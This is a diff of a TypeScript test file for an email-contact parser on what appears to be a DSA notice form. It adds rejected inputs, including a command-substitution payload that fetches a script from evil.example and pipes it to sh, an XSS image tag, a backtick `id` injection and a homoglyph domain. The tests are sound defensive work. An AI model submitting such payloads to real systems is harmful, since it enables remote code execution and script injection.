@@ -132,13 +132,13 @@ describe('the contact and the good-faith statement (DSA Art. 16, spec §6.6)', (
 
   it('keeps the contact rule of the server', () => {
     const link = `https://nylzo.test/m/${'A'.repeat(22)}#1.0.${'B'.repeat(43)}`;
-    const longest = `${'a'.repeat(243)}@example.cz`;
+    const longest = `${'a.'.repeat(120)}b@example.cz`;
     const valid: readonly (readonly [string, string])[] = [
       ['', ''],
       [' \t\n', ''],
       ['  jana@example.cz\n', 'jana@example.cz'],
-      ["o'brien+abuse@mail.example", "o'brien+abuse@mail.example"],
-      ['jiří@háček.example', 'jiří@háček.example'],
+      ['jana.novakova+abuse@mail.example', 'jana.novakova+abuse@mail.example'],
+      ['jiri@xn--hek-0na27a.example', 'jiri@xn--hek-0na27a.example'],
       [longest, longest],
     ];
     expect(valid.map(([raw]) => parseContact(raw))).toEqual(valid.map(([, contact]) => contact));
@@ -160,7 +160,14 @@ describe('the contact and the good-faith statement (DSA Art. 16, spec §6.6)', (
       'jana@example.cz/m/x',
       'jana@exa_mple.cz',
       'ja\u{D800}na@example.cz',
-      `${'a'.repeat(244)}@example.cz`,
+      `${'a.'.repeat(122)}b@example.cz`,
+      "o'brien@mail.example",
+      'jiří@háček.example',
+      'abuse@ex\u{430}mple.com',
+      '$(curl${IFS}-s${IFS}evil.example|sh)@example.com',
+      '<img/src=x/onerror=alert(1)>@example.com',
+      'PHWPLfc5h_ttYhLwBUZM_r6y4UiSFMC54lqQJKLHYYE@example.com',
+      'a`id`b@example.com',
       link,
       `${link}@example.cz`,
       `jana@example.cz ${link}`,
